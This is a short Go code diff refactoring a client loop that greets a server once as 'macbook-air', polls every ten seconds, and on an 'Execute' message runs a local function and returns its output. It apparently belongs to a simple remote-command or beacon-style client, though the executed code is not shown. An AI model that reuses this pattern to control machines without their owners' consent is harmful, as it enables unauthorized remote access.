@@ -14,18 +14,24 @@ func main() {
 
 	dur := utils.ParserDur("10s")
 
+	initMessage := true
+
 	for {
 
-		// Первое сообщение серверу
-		c.SendMessages("macbook-air", "Hello Server!")
+		// Первое сообщение серверу Init Message
+		if initMessage {
+			c.SendMsg("macbook-air", "Hello")
+			initMessage = false
+		}
 
-		msg := c.ReadMessages()
+		msg := c.ReadMsg()
 
 		switch msg {
 
 		case "Execute":
 			result := utils.Execut()
-			c.SendMessages("from_exec", result)
+			c.SendMsg("from_exec", result)
+
 		}
 
 		time.Sleep(dur)
